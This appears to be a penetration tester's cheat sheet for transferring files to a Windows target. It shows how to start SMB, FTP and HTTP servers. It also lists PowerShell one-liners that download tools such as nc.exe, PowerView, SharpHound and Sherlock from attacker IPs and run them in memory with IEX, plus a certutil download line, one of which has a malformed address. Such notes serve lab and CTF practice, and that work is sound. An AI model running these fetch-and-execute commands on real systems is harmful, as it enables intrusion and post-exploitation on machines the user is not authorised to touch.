# Windows

### SMB&#x20;

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
```

### FTP

```
python -m myftpdlib 21
```

### Powershell&#x20;

```
To just download:
powershell.exe -c "iwr http://192.168.49.100:443/nc.exe -OutFile C:\Users\viewer\nc.exe"

To execute without loading on memory:
iex(iwr http://192.168.143.123:443/Sherlock.ps1 -UseBasicParsing)

To dowload and execute:
IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.16:9001/PowerView.ps1') 
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"

echo IEX(New-Object Net.WebClient).DownloadString('http://10.50.59.39:14465/SharpHound.ps1') | powershell -noprofile
```

### Certutil

```
python3 -m http.server 80
certutil.exe -urlcache -f http://10.101.01./file.txt file.txt
```
